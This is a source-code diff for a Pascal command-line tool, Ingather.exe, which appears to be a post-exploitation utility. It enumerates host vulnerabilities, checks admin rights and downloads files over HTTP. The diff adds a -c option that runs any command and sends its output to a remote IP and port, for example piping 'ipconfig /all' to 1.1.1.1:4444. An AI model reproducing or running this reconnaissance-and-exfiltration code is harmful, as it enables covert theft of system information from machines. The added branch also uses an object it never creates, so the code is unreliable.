@@ -40,11 +40,12 @@ var
   tfOut        : TextFile;
   download     : String;
   save         : String;
+  command      : String;
 begin
   output:= ''; // initialize the string
 
   // quick check parameters
-  ErrorMsg:= CheckOptions('dehiposz','download enum help ip out port save');
+  ErrorMsg:= CheckOptions('cdehiposz','command download enum help ip out port save');
   if ErrorMsg <> '' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -73,28 +74,28 @@ begin
   end;
 
   // do vulnerability enumeration on host
-  if HasOption('e','enum') then begin
-    vulns:= TFindVulns.Create;
+  if HasOption('e','enum') or HasOption('c','command') then begin
     execute:= TRunCMD.Create;
-    for x:= 1 to NUM_CMDS do begin
-      OutputStream:= execute.Run(CMD[x]);
-      output:= concat(output, vulns.StreamToString(OutputStream));
-    end;
-    vulns.getVulnServices(Output);
+    if not HasOption('c','command') then begin
+      vulns:= TFindVulns.Create;
+      for x:= 1 to NUM_CMDS do begin
+        OutputStream:= execute.Run(CMD[x]);
+        output:= concat(output, vulns.StreamToString(OutputStream));
+      end;
+      vulns.getVulnServices(Output);
+      vulns.Free;
+    end else
+      if HasOption('i','ip') and HasOption('p','port') then begin
+        command:= Self.GetOptionValue('c','command');
+        OutputStream:= execute.Run(command);
+        output:= vulns.StreamToString(OutputStream);
+      end else begin
+        writeln('Must use -c with -i and -p!');
+        Terminate;
+        Exit;
+      end;
+    OutputStream.Free;
     execute.Free;
-    vulns.Free;
-
-    // Is user an admin
-    escalate:= TRunAs.Create;
-    if escalate.IsUserAdmin then
-      writeln('You are an admin!!!')
-    else
-      writeln('You are not an admin.');
-    {if escalate.RunAsAdmin(0, 'whoami', '/all') then
-      writeln('You are not an admin!!!')
-    else
-      writeln('Did not run as admin!!!');}
-    escalate.Free;
 
     // Send output to another computer?
     if HasOption('i','ip') and HasOption('p','port') then begin
@@ -113,8 +114,17 @@ begin
       writeln(tfOut, output);
     end;
 
-    // Clean up
-    OutputStream.Free;
+    // Is user an admin
+    escalate:= TRunAs.Create;
+    if escalate.IsUserAdmin then
+      writeln('You are an admin!!!')
+    else
+      writeln('You are not an admin.');
+    {if escalate.RunAsAdmin(0, 'whoami', '/all') then
+      writeln('You are not an admin!!!')
+    else
+      writeln('Did not run as admin!!!');}
+    escalate.Free;
   end;
 
   Terminate;
@@ -136,6 +146,7 @@ begin
   writeln;
   writeln('Usage: Ingather.exe --enum -i 1.1.1.1 -p 4444 -o output.txt');
   writeln('       Ingather.exe --download http://www.abcded.com/abc.txt --save c:\temp\abc.text');
+  writeln('       Ingather.exe -c "ipconfig /all" -i 1.1.1.1 -p 4444');
   writeln;
   writeln('Download file over HTTP:');
   writeln('       -d --download    : download file');
@@ -145,6 +156,8 @@ begin
   writeln('Enumerate vulnerabilities:');
   writeln('       -e --enum        : enumerate host vulnerabilities');
   writeln('Output options:');
+  writeln('       -c --command     : run command and send output across network');
+  writeln('                          must be used with -i and -p');
   writeln('       -h --help        : print this help message');
   writeln('       -i --ip          : destination IP address');
   writeln('       -p --port        : destination port');
